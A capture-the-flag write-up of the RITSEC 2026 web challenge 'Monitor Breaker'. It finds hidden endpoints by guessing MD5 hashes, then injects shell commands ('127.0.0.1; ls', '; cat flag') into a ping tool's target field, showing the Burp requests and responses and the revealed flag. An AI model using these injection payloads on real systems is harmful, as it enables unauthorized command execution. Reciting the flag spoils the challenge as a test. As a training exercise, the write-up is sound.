---
layout: post
title:  "Monitor Breaker"
date:   2026-04-06 18:25:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /RITSECCTF-2026-monitor-breaker/
---

**Category**: web

**Description**: A maintenance interface leaked into production. Your job: interact with the system monitors and extract the flag from this broken console. _This challenge was sponsored by SkillBit._

I start my instance at `https://monitor-breaker-53486282-e407-4a50-8227-bdf267ba74a9.ctf.ritsec.club/` and go to the site:

![Alt text](/images/system-portal.png)

The "Network Health" section has a pop up that says: This section is under maintenance

The "Performance Monitor" section takes me to `https://monitor-breaker-53486282-e407-4a50-8227-bdf267ba74a9.ctf.ritsec.club/_sys/c4ca4238a0b923820dcc509a6f75849b`.

"System Logs" takes me to `https://monitor-breaker-53486282-e407-4a50-8227-bdf267ba74a9.ctf.ritsec.club/_sys/c81e728d9d4c2f636f067f89cc14862c`.

`c4ca4238a0b923820dcc509a6f75849b` and `c81e728d9d4c2f636f067f89cc14862c` are MD5 hashes for 1 and 2. 

At first I get the MD5 hash for 3 and go to `https://monitor-breaker-53486282-e407-4a50-8227-bdf267ba74a9.ctf.ritsec.club/_sys/eccbc87e4b5ce2fe28308fd9f2a7baf3` but the page does not exist. 

Then I get the MD5 hash for 0 and go to `https://monitor-breaker-53486282-e407-4a50-8227-bdf267ba74a9.ctf.ritsec.club/_sys/cfcd208495d565ef66e7dff9f98764da`:

![Alt text](/images/network-ping-tool.png)

I get access to the network ping tool (the section of the site under maintenance). I cannot type letters into the `Target Host / IP` input. I enter `127.0.0.1` and intercept the request in burpsuite. Request:
```http
POST /_sys/cfcd208495d565ef66e7dff9f98764da HTTP/1.1
Host: monitor-breaker-53486282-e407-4a50-8227-bdf267ba74a9.ctf.ritsec.club
Cookie: a78ea99e5c9811a1ce5f025964a555ae=0c3d22ad5ae9bc8cee80a9bcf099c875
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://monitor-breaker-53486282-e407-4a50-8227-bdf267ba74a9.ctf.ritsec.club/_sys/cfcd208495d565ef66e7dff9f98764da
Content-Type: multipart/form-data; boundary=----geckoformboundary43a935539c4dce82b6890f179ff81802
Content-Length: 294
Origin: https://monitor-breaker-53486282-e407-4a50-8227-bdf267ba74a9.ctf.ritsec.club
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

------geckoformboundary43a935539c4dce82b6890f179ff81802
Content-Disposition: form-data; name="target"

127.0.0.1
------geckoformboundary43a935539c4dce82b6890f179ff81802
Content-Disposition: form-data; name="command_type"

ping
------geckoformboundary43a935539c4dce82b6890f179ff81802--
```

Response:
```http
HTTP/1.1 200 OK
server: Werkzeug/2.3.7 Python/3.11.15
date: Sat, 04 Apr 2026 08:18:53 GMT
content-type: application/json
content-length: 45

{"output":"\n/bin/sh: 1: ping: not found\n"}
```

In burpsuite I can type letters now. The feature is broken but is still interacting with the command line. I try basic command injection:
```shell
------geckoformboundary43a935539c4dce82b6890f179ff81802
Content-Disposition: form-data; name="target"

127.0.0.1; ls
------geckoformboundary43a935539c4dce82b6890f179ff81802
Content-Disposition: form-data; name="command_type"

ping
------geckoformboundary43a935539c4dce82b6890f179ff81802--
```

Response:
```http
HTTP/1.1 200 OK
server: Werkzeug/2.3.7 Python/3.11.15
date: Sat, 04 Apr 2026 08:20:00 GMT
content-type: application/json
content-length: 125

{"output":"app.py\nflag-9d444ad0f475b52e79a1713f25646dce.txt\nrequirements.txt\ntemplates\n\n/bin/sh: 1: ping: not found\n"}
```
It works!

Get the flag:
```shell
------geckoformboundary43a935539c4dce82b6890f179ff81802
Content-Disposition: form-data; name="target"

127.0.0.1; cat flag-9d444ad0f475b52e79a1713f25646dce.txt
------geckoformboundary43a935539c4dce82b6890f179ff81802
Content-Disposition: form-data; name="command_type"

ping
------geckoformboundary43a935539c4dce82b6890f179ff81802--
```

Response:
```http
HTTP/1.1 200 OK
server: Werkzeug/2.3.7 Python/3.11.15
date: Sat, 04 Apr 2026 08:20:47 GMT
content-type: application/json
content-length: 94

{"output":"RS{1_br0k3_17_e6ebced80740d006889f26ceeeee666b}\n\n/bin/sh: 1: ping: not found\n"}
```

`RS{1_br0k3_17_e6ebced80740d006889f26ceeeee666b}`